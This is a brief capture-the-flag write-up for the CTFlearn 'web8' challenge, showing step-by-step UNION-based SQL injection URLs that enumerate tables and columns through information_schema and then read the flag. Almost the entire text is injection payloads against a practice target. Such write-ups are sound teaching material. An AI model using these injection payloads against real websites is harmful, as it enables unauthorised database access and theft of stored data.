View dog information of id 1, the url changes to 

```html
https://web.ctflearn.com/web8/?id=1
```

Test injection with UNION

```html
https://web.ctflearn.com/web8/?id=1%20union%20select%201,2,3,4
```

```html
https://web.ctflearn.com/web8/?id=1%20union%20select%201,2,table_name,4%20from%20information_schema.tables%20where%20table_schema=database()
```

There are two extra tables shown in result page, ``w0w_y0u_f0und_m3`` and ``webeight``


Try to find out the column names.

```html
https://web.ctflearn.com/web8/?id=1%20union%20select%201,table_name,column_name,4%20from%20information_schema.columns%20where%20table_schema=database()
```

The pages shows  ``w0w_y0u_f0und_m3`` contains one column, ``f0und_m3``. Get values of ``f0und_m3``

```html
https://web.ctflearn.com/web8/?id=1%20union%20select%201,2,f0und_m3,4%20from%20w0w_y0u_f0und_m3
```

The flag is shown.
